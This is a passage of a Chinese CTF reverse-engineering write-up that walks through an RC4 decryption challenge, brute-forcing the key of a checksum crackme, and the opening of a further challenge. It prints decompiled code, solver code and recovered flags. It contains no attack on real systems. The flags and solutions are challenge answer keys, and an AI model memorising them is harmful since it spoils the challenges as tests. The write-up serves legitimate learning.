class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    enc <span class=\"token operator\">=</span> ARC4<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    res <span class=\"token operator\">=</span> enc<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    res <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">,</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    file_path <span class=\"token operator\">=</span> Path<span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>parent <span class=\"token operator\">/</span> <span class=\"token string\">\"final\"</span> <span class=\"token operator\">/</span> <span class=\"token string\">\"enflag.txt\"</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">,</span><span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    key <span class=\"token operator\">=</span> <span class=\"token string\">'[Warnning]Access_Unauthorized'</span>  <span class=\"token comment\"># 加密 key</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    encrypt_data <span class=\"token operator\">=</span> rc4_encrypt<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span>     <span class=\"token comment\"># 加密方法</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'加密后:'</span><span class=\"token punctuation\">,</span>encrypt_data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'解密后:'</span><span class=\"token punctuation\">,</span>rc4_decrypt<span class=\"token punctuation\">(</span>encrypt_data<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>         <span class=\"token comment\"># 解密方法</span></pre></td></tr></tbody></table></figure><p>得到</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>加密后: b'w4KjJfZMNjtZzMTp8bUyGLGWrr8INQ=='</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>解密后: flag {RC4&amp;-&gt;ENc0d3F1le}</pre></td></tr></tbody></table></figure><p>因此，flag 为 <code>flag{RC4&amp;-&gt;ENc0d3F1le}</code></p>\n<h2 id=\"re3\"><a class=\"anchor\" href=\"#re3\">#</a> re3</h2>\n<p>打开，反汇编，得到</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  size_t v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-134h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-130h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+14h] [rbp-12Ch]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-128h]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">int</span> v9<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1Ch] [rbp-124h]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">int</span> v10<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-120h]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">int</span> v11<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+24h] [rbp-11Ch]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">int</span> v12<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+28h] [rbp-118h]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">int</span> v13<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+2Ch] [rbp-114h]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">int</span> v14<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+30h] [rbp-110h]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">int</span> v15<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+34h] [rbp-10Ch]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v16<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+38h] [rbp-108h]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">int</span> v17<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+40h] [rbp-100h]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+60h] [rbp-E0h] BYREF</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">char</span> v19<span class=\"token punctuation\">[</span><span class=\"token number\">107</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+65h] [rbp-DBh] BYREF</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">char</span> dest<span class=\"token punctuation\">[</span><span class=\"token number\">104</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+D0h] [rbp-70h] BYREF</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v21<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+138h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  v21 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  v7 <span class=\"token operator\">=</span> <span class=\"token number\">80</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  v8 <span class=\"token operator\">=</span> <span class=\"token number\">64227</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  v9 <span class=\"token operator\">=</span> <span class=\"token number\">226312059</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  v10 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1540056586</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  v11 <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  v12 <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  v13 <span class=\"token operator\">=</span> <span class=\"token number\">3833</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"plz input the key:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token function\">strncpy</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> v19<span class=\"token punctuation\">,</span> v3 <span class=\"token operator\">-</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  dest<span class=\"token punctuation\">[</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token function\">__isoc99_sscanf</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%x\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  v17<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v7<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  v17<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v8<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  v17<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v9<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  v17<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v10<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  v17<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v11 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">12</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> v12<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  v17<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  v17<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  v16 <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> v16 <span class=\"token operator\">+=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v17<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> v16 <span class=\"token operator\">&gt;</span> <span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">;</span> v16 <span class=\"token operator\">=</span> v15 <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>v16 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>      v14 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>v16<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>      v15 <span class=\"token operator\">=</span> v16 <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v16 <span class=\"token operator\">==</span> <span class=\"token number\">0xFFFF</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"OK\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>将该程序复制，穷举 v5 的值</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h&gt;</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;string&gt;</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    size_t v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">int</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-134h] BYREF</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-130h]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+14h] [rbp-12Ch]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">int</span> v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-128h]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">int</span> v9<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1Ch] [rbp-124h]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">int</span> v10<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-120h]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">int</span> v11<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+24h] [rbp-11Ch]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">int</span> v12<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+28h] [rbp-118h]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">int</span> v13<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+2Ch] [rbp-114h]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">int</span> v14<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+30h] [rbp-110h]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">int</span> v15<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+34h] [rbp-10Ch]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> __int64 v16<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+38h] [rbp-108h]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">int</span> v17<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+40h] [rbp-100h]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+60h] [rbp-E0h] BYREF</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">char</span> v19<span class=\"token punctuation\">[</span><span class=\"token number\">107</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+65h] [rbp-DBh] BYREF</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">char</span> dest<span class=\"token punctuation\">[</span><span class=\"token number\">104</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+D0h] [rbp-70h] BYREF</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> __int64 v21<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+138h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    v5 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        v7 <span class=\"token operator\">=</span> <span class=\"token number\">80</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        v8 <span class=\"token operator\">=</span> <span class=\"token number\">64227</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        v9 <span class=\"token operator\">=</span> <span class=\"token number\">226312059</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        v10 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1540056586</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        v11 <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        v12 <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        v13 <span class=\"token operator\">=</span> <span class=\"token number\">3833</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        v17<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v7<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        v17<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v8<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        v17<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v9<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        v17<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v10<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        v17<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v11 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">12</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> v12<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        v17<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        v17<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        v16 <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>v16 <span class=\"token operator\">+=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v17<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> v16 <span class=\"token operator\">&gt;</span> <span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">;</span> v16 <span class=\"token operator\">=</span> v15 <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>v16<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                v14 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>v16<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                v15 <span class=\"token operator\">=</span> v16 <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>v16 <span class=\"token operator\">==</span> <span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"OK\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        v5<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>程序输出结果为 <code>6815</code> ，十六进制为 <code>1a9f</code>  (十六进制输入有效)</p>\n<p>flag 为 <code>flag{1a9f}</code></p>\n<h2 id=\"逆向4\"><a class=\"anchor\" href=\"#逆向4\">#</a> 逆向 4</h2>\n<p>打开，字符串窗口可以看到 <code>请输入正确的数字:\\n</code> ，跟进到函数 <code>sub_140001170</code> ，得到</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl __noreturn <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  qword_140004618 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>__int64<span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10u</span>i64<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  qword_140004620 <span class=\"token operator\">=</span> 